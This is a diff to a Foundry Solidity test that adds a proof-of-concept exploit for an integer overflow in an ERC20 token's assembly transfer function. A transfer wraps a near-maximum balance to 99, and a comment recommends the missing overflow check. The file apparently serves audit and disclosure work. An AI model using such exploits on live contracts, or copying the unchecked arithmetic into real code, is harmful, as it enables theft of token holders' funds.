@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.0;
 import "forge-std/src/Test.sol";
-
+import "else/ERC20Token0x.sol";
 /* function _transfer(address from, address to, uint256 value) internal returns (bool success) {
         assembly ("memory-safe") {
             if iszero(from) {
@@ -39,7 +39,7 @@ import "forge-std/src/Test.sol";
             // no check for it to see if the toAmount doesnt overflow because of toAmount += value
             // recomendation is to put:
             // if gt(value, not(0)-toAmount) { revert(0,0) }
-            
+
             sstore(fromSlot, sub(fromAmount, value))
             sstore(toSlot, add(toAmount, value))
             success := 1
@@ -50,7 +50,23 @@ import "forge-std/src/Test.sol";
 
 contract AttackPOC is Test {
 
-    function setUp () public {
-        
+    ERC20Token0x public token;
+    address public sender;
+    address public receiver;
+
+    function setUp() public {
+        token = new ERC20Token0x(type(uint256).max);
+        sender = address(1);
+        receiver = address(2);
+    }
+
+    function testOverflow() public {
+        token.mint(sender, 10000);
+        token.mint(receiver, type(uint256).max-100);
+        vm.prank(sender);
+        token.transfer(receiver, 200);
+        // now it overflows cause we are above the unt max which rounds it down to 0 and 
+        // continues making it 99 in our case
+        assertEq(token._balanceOf(receiver),99);
     }
 }
